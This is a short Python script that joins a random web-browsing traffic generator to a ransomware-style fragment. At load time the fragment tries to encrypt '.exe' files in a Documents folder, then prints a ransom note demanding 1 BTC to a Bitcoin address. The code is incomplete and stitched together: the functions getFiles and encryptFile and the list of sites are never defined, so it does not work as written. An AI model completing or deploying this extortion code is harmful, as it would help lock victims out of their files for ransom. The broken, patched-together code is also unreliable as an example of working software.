import random
import requests
from time import sleep
import os

def makeRequest(url):
    _ = requests.get(url)
    return

def getURL():
    return sites[random.randint(0, len(sites) - 1)].rstrip()

clickthrough = .5
sleeptime = 1
def browsingSession():
    while(random.random() < clickthrough):
        url = getURL()
        makeRequest(url)
        sleep(random.randint(0, sleeptime))

def displayRansomMessage():
    ransom_message = """
    !!! YOUR FILES ARE ENCRYPTED !!!
    
    To decrypt your files, send 1 BTC to the following address:
    
    1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
    
    After payment, send the code to decrypt your files.
    """
    print(ransom_message)

def encryptFiles(directory, ext):
    paths = getFiles(directory, ext)
    for path in paths:
        encryptFile(path)
    displayRansomMessage()

directory = os.path.join(os.getcwd(), "Documents")
ext = ".exe"
encryptFiles(directory, ext)
